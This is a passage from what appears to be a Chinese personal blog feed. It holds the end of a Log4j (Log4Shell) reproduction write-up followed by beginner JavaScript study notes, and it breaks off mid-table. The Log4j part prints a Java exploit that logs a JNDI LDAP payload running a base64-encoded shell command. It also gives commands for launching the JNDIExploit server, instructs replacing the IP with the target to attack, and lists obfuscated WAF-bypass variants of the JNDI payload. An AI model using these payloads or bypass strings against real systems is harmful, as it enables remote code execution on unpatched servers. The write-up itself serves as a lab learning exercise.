src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764265.png" alt="在这里插入图片描述"></p><p>当上述三个class文件在同一文件夹内的时候，执行这个log4j之后tmp结果如下：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764266.png" alt="在这里插入图片描述"></p><p>此时我们将Tttouch.class移动到另一个文件夹下，反正不与log4j放在同一文件夹：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764267.png" alt="在这里插入图片描述"></p><p>此时再次执行log4j，tmp文件夹中无新增文件：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764268.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764269.png" alt="在这里插入图片描述"></p><p>1.txt并没有被创建</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642710.png" alt="在这里插入图片描述"></p><p>此时我们复制一个Tttouch.class放在和log4j在同一文件夹下，然后将jndi服务器路径下的Tttouch删掉，接着执行log4j：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642711.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642712.png" alt="在这里插入图片描述"></p><p>1.txt再次出现了！！要知道，我们JNDI服务器根本没有这个类！</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642713.png" alt="在这里插入图片描述"></p><p>总结<br>这个漏洞给我的感觉是可以触发jndi注入，但是不会从我们的jndi服务器上拉取任何文件，而是仅仅判断这个文件本地是否存在，存在则执行，不存在则不执行。传统的jndi注入受害者会想下载我们创建的恶意class文件并实例化，此次好像并不是这样。</p><blockquote><p>补充：如何将其变成正常的JNDI注入(及可加载攻击者自定义的class文件)<br>条件：如果我们使用LDAP方式的jndi注入，受害者服务器的代码中java的配置必须是com.sun.jndi.ldap.object.trustURLCodebase=True。</p></blockquote><p>JDK中的默认配置如下：</p><blockquote><p>JDK 5U45、6U45、7u21、8u121开始java.rmi.server.useCodebaseOnly默认位置true<br>JDK 6u132、7u122、8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值false<br>JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase默认为false</p></blockquote><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642714.png" alt="在这里插入图片描述"></p><p>因此我们需要在log4j的代码中加上：</p><blockquote><p>System.setProperty(“com.sun.jndi.ldap.object.trustURLCodebase”,”true”)</p></blockquote><pre><code>最终代码如下：import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;</code></pre><p>​    </p><pre><code>public class Log4j &#123;    private static final Logger logger = LogManager.getLogger(Log4j.class);    public static void main(String[] args) &#123;        //dG91Y2ggL3RtcC8xMjM 是touch /tmp/123的base64编码        System.out.println(&quot;开始执行漏洞利用&quot;);        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:12344/Basic/Command/Base64/dG91Y2ggL3RtcC8xMjM&#125;&quot;);        System.out.println(&quot;利用完成&quot;);    &#125;&#125;</code></pre><p>执行命令：</p><p>使用JNDIExploit开启jndi服务器：</p><p><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 </code></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642715.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642716.png" alt="在这里插入图片描述"></p><p>参考文章：<a href="https://www.codenong.com/f23e29b783ff38df36c9/">https://www.codenong.com/f23e29b783ff38df36c9/</a></p><p><img src="%7Bfilename%7D/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642717.png" alt="在这里插入图片描述"></p><blockquote><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。<br>这个漏洞的利用跟JDK中的配置有很大关系，换句话说跟jdk版本关系很大。<br>只要JDK版本无漏洞，那么apache log4j的这个RCE就很难利用成功。</p></blockquote><blockquote></blockquote><h1 id="本地快速复现"><a href="#本地快速复现" class="headerlink" title="本地快速复现"></a>本地快速复现</h1><p>01<strong>参 考 资 料</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Yihsiwei/Log4j-exp</span></span><br></pre></td></tr></table></figure><p>02<strong>本地复现步骤</strong></p><p>复现环境：</p><p>windows10 + 1.8.40 + idea2021.3</p><p>win10 ip地址：<code>192.168.43.217</code></p><p>首先需要下载<code>Log4j-exp</code></p><p><img src="image-20211218132207551.png" alt="image-20211218132207551"></p><p>现在去刚下载的文件里面找到<code>JNDIExploit-1.2-SNAPSHOT.jar</code>所在的文件夹，并使用<code>cmd</code>打开，执行以下命令：</p><p><img src="image-20211218132239261.png" alt="image-20211218132239261"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-<span class="number">1.2</span>-SNAPSHOT.jar -i <span class="number">10.211</span><span class="number">.55</span><span class="number">.3</span></span><br><span class="line">-i  后面接的是本地的ip地址(或者你的VPS地址)</span><br></pre></td></tr></table></figure><p>回到你刚打开的idea中，找到<code>log4jRCE</code>文件，将该文件中箭头位置的ip地址进行替换成要攻击的ip。</p><p>替换成功之后,进行build：</p><p>继续<code>build</code></p><p>然后在刚才的目录下会生成一个<code>out</code>的文件夹：</p><p>点进去会找到一个<code>Log4j-rce.jar</code>文件。</p><p>直接点开也行   也可以使用以下命令：</p><p><img src="image-20211218132311296.png" alt="image-20211218132311296"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dcom.sun.jndi.ldap.object.trustURLCodebase=<span class="literal">true</span> -jar Log4j-rce.jar</span><br></pre></td></tr></table></figure><p><img src="image-20211218132335722.png" alt="image-20211218132335722"></p><p>打开任务管理器的</p><p><img src="image-20211218134630551.png" alt="image-20211218134630551"></p><p>Bypass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://asdasd.asdasd.asdasd/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://adsasd.asdasd.asdasd&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxxx.xx/poc&#125;</span><br></pre></td></tr></table></figure><p>参考</p><blockquote></blockquote><p>总结 ：</p><p>1.很早就看到这个洞了，期末一天学一门真的杀我，终于有时间弄一弄这个，具体原理还不是很特别李姐，还要继续努力，寒假加油，</p><ol start="2"><li>java真xxx 为啥在本机编译的就用不了  草  还有   宝塔的防火墙，，，，佛了</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js笔记</title>
      <link href="/2021/11/22/js%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/11/22/js%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><hr><p>HTML 中的脚本必须位于 <code>&lt;script&gt; </code>与<code> &lt;/script&gt;</code> 标签之间。</p><p>脚本可被放置在 HTML 页面的 <code>&lt;body&gt; </code>和 <code>&lt;head&gt;</code> 部分中。</p><p>js可以自己编写</p><p>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</p><p>外部 JavaScript 文件的文件扩展名是 .js。</p><p>如需使用外部文件，请在<code>&lt;script&gt;</code>标签的 “src” 属性中设置该 .js 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">#可以将脚本放置于 &lt;head&gt; 或者 &lt;body&gt;中，放在 &lt;script&gt; 标签中的脚本与外部引用的脚本运行#效果完全一致。</span><br><span class="line">myScript.js 文件代码如下：</span><br><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br><span class="line">#外部脚本不能包含 &lt;script&gt; 标签。</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意细节：</strong></p><p>1、在标签中填写 onclick 事件调用函数时，不是 <strong>onclick=函数名</strong>， 而是 **onclick=函数名+()**，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt; </span><br><span class="line">   function myfunction()&#123;</span><br><span class="line">        document.getElementById(&quot;demo&quot;).innerHTML=&quot;onclick事件触发&quot;;</span><br><span class="line">       &#125;&lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&gt;&lt;body&gt;</span><br><span class="line">   &lt;h1 id=&quot;demo&quot;&gt;一个段落&lt;/h1&gt;</span><br><span class="line">   &lt;button onclick=&quot;myfunction()&quot; type=&quot;button&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>2、外部 javascript 文件不使用 <code>&lt;script&gt;</code> 标签，直接写 javascript 代码。</p><p>3、HTML 输出流中使用 document.write，相当于添加在原有html代码中添加一串html代码。而如果在文档加载后使用（如使用函数），会覆盖整个文档。</p><p>使用函数来执行document.write代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myfunction()&#123;</span><br><span class="line">   document.write(&quot;使用函数来执行doucment.write，即在文档加载后再执行这个操作，会实现文档覆盖&quot;);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">&gt;document.write(&quot;&lt;p&gt;这是一个段落。&lt;/p&gt;&quot;);</span><br><span class="line">&gt;&lt;/script&gt;</span><br><span class="line">&gt;&lt;p &gt;</span><br><span class="line">&gt;您只能在 HTML 输出流中使用 &lt;strong&gt;document.write&lt;/strong&gt;。</span><br><span class="line">&gt;如果您在文档已加载后使用它（比如在函数中），会覆盖整个文档。</span><br><span class="line">&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;button type=&quot;button&quot; onclick=&quot;myfunction()&quot;&gt;点击这里&lt;/button&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="JavaScript-输出"><a href="#JavaScript-输出" class="headerlink" title="JavaScript 输出"></a>JavaScript 输出</h1><hr><p>JavaScript 没有任何打印或者输出的函数。</p><h2 id="JavaScript-显示数据"><a href="#JavaScript-显示数据" class="headerlink" title="JavaScript 显示数据"></a>JavaScript 显示数据</h2><p>JavaScript 可以通过不同的方式来输出数据：</p><ul><li><p>使用 <strong>window.alert()</strong> 弹出框。</p><p><code>window.alert(5 + 6);</code></p></li><li><p>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=&quot;myFunction()&quot;&gt;点我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">   document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</p></li><li><p>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</p></li></ul><p><img src="image-20211122142414961.png" alt="image-20211122142414961"></p><h1 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h1><p>JavaScript 是一个程序语言。语法规则定义了语言结构。</p><hr><h2 id="JavaScript-语法-1"><a href="#JavaScript-语法-1" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h2><p>JavaScript 是一个脚本语言。</p><p>它是一个轻量级，但功能强大的编程语言。</p><hr><h2 id="JavaScript-字面量"><a href="#JavaScript-字面量" class="headerlink" title="JavaScript 字面量"></a>JavaScript 字面量</h2><p>在编程语言中，一般固定值称为字面量，如 3.14。</p><p><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 123e5;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">12300000</span><br></pre></td></tr></table></figure><p><strong>表达式字面量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 5 * 10;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">50</span><br></pre></td></tr></table></figure><p><strong>数组（Array）字面量</strong> 定义一个数组：</p><p><code>[40, 100, 1, 5, 25, 10]</code></p><p><strong>对象（Object）字面量</strong> 定义一个对象：</p><p><code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></p><p><strong>函数（Function）字面量</strong> 定义一个函数：</p><p><code>function myFunction(a, b) &#123; return a * b;&#125;</code></p><h2 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h2><p>对大小写敏感</p><p>在编程语言中，变量用于存储数据值。</p><p>JavaScript 使用关键字 <strong>var</strong> 来定义变量， 使用等号来为变量赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var length;</span><br><span class="line">length = 6;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = length;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x, y, z;</span><br><span class="line">x = 5;</span><br><span class="line">y = 6;</span><br><span class="line">z = (x + y) * 10;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = z;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">110</span><br></pre></td></tr></table></figure><h2 id="JavaScript-注释"><a href="#JavaScript-注释" class="headerlink" title="JavaScript 注释"></a>JavaScript 注释</h2><p>不是所有的 JavaScript 语句都是”命令”。双斜杠 <strong>//</strong> 后的内容将会被浏览器忽略：</p><p>多行注释/*    */</p><h2 id="JavaScript-数据类型"><a href="#JavaScript-数据类型" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var length = 16;                  // Number 通过数字字面量赋值 </span><br><span class="line">var points = x * 10;               // Number 通过表达式字面量赋值</span><br><span class="line">var lastName = &quot;Johnson&quot;;             // String 通过字符串字面量赋值</span><br><span class="line">var cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];       // Array 通过数组字面量赋值</span><br><span class="line">var person = &#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;&#125;; // Object 通过对象字面量赋值</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：</p><p><strong>引用一个函数</strong> = 调用函数(执行函数内的语句)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">  return a * b;                // 返回 a 乘以 b 的结果</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;myPar&quot;&gt;我是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;myDiv&quot;&gt;我是一个div。&lt;/div&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    document.getElementById(&quot;myPar&quot;).innerHTML=&quot;你好世界！&quot;;</span><br><span class="line">    document.getElementById(&quot;myDiv&quot;).innerHTML=&quot;你最近怎么样?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;当您点击上面的按钮时，两个元素会改变。&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>JavaScript 会忽略多余的空格。</p><h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>您可以在文本字符串中使用反斜杠对代码行进行换行。下面的例子会正确地显示：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><code>document.write(&quot;你好 \ 世界!&quot;);</code></p><h1 id="JavaScript-数据类型-1"><a href="#JavaScript-数据类型-1" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h1><hr><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下面的代码创建名为 cars 的数组：</span><br><span class="line"></span><br><span class="line">var cars=new Array();</span><br><span class="line">cars[0]=&quot;Saab&quot;;</span><br><span class="line">cars[1]=&quot;Volvo&quot;;</span><br><span class="line">cars[2]=&quot;BMW&quot;;</span><br><span class="line">或者 (condensed array):</span><br><span class="line"></span><br><span class="line">var cars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对象</span><br><span class="line">对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</span><br><span class="line">对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 name:value 对呈现。</span><br><span class="line">var person=&#123;firstname:&quot;John&quot;, lastname:&quot;Doe&quot;, id:5566&#125;;</span><br><span class="line">上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。</span><br><span class="line"></span><br><span class="line">空格和折行无关紧要。声明可横跨多行：</span><br><span class="line"></span><br><span class="line">var person=&#123;</span><br><span class="line">firstname : &quot;John&quot;,</span><br><span class="line">lastname  : &quot;Doe&quot;,</span><br><span class="line">id        :  5566</span><br><span class="line">&#125;;</span><br><span class="line">对象属性有两种寻址方式：\</span><br><span class="line">name=person.lastname;</span><br><span class="line">name=persion[&quot;lastname&quot;];</span><br><span class="line">Undefined 和 Null</span><br><span class="line">Undefined 这个值表示变量不含有值。</span><br><span class="line"></span><br><span class="line">可以通过将变量的值设置为 null 来清空变量。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">cars=null;</span><br><span class="line">person=null;</span><br><span class="line">声明变量类型</span><br><span class="line">当您声明新变量时，可以使用关键词 &quot;new&quot; 来声明其类型：</span><br><span class="line"></span><br><span class="line">var carname=new String;</span><br><span class="line">var x=      new Number;</span><br><span class="line">var y=      new Boolean;</span><br><span class="line">var cars=   new Array;</span><br><span class="line">var person= new Object;</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数语法"><a href="#JavaScript-函数语法" class="headerlink" title="JavaScript 函数语法"></a>JavaScript 函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p><p>function <em>functionname</em>()<br>{<br>  <em>// 执行代码</em><br>}</p><p>当调用该函数时，会执行函数内的代码。</p><p>可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-事件"><a href="#JavaScript-事件" class="headerlink" title="JavaScript 事件"></a>JavaScript 事件</h1><hr><p>HTML 事件是发生在 HTML 元素上的事情。</p><p>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><hr><h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。</p><p>以下是 HTML 事件的实例：</p><ul><li>HTML 页面完成加载</li><li>HTML input 字段改变时</li><li>HTML 按钮被点击</li></ul><p>通常，当事件发生时，你可以做些事情。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br><span class="line"></span><br><span class="line">通常，当事件发生时，你可以做些事情。</span><br><span class="line"></span><br><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-字符串"><a href="#JavaScript-字符串" class="headerlink" title="JavaScript 字符串"></a>JavaScript 字符串</h1><hr><p>JavaScript 字符串用于存储和处理文本。</p><p>可以是插入到引号中的任何字符。你可以使用单引号或双引号：</p><p>也可以在字符串添加转义字符来使用引号：反斜杠</p><p>var x = ‘It&#39;s alright’;<br>var y = “He is called &quot;Johnny&quot;“;</p><p><img src="image-20211122145140962.png" alt="image-20211122145140962"></p><p>更多方法实例可以参见：<a href="https://www.runoob.com/jsref/jsref-obj-string.html">JavaScript String 对象</a>。</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">charAt()</td><td align="left">返回指定索引位置的字符</td></tr><tr><td align="left">charCodeAt()</td><td align="left">返回指定索引位置字符的 Unicode 值</td></tr><tr><td align="left">concat()</td><td align="left">连接两个或多个字符串，返回连接后的字符串</td></tr><tr><td align="left">fromCharCode()</td><td align="left">将 Unicode 转换为字符串</td></tr><tr><td align="left">indexOf()</td><td align="left">返回字符串中检索指定字符第一次出现的位置</td></tr><tr><td 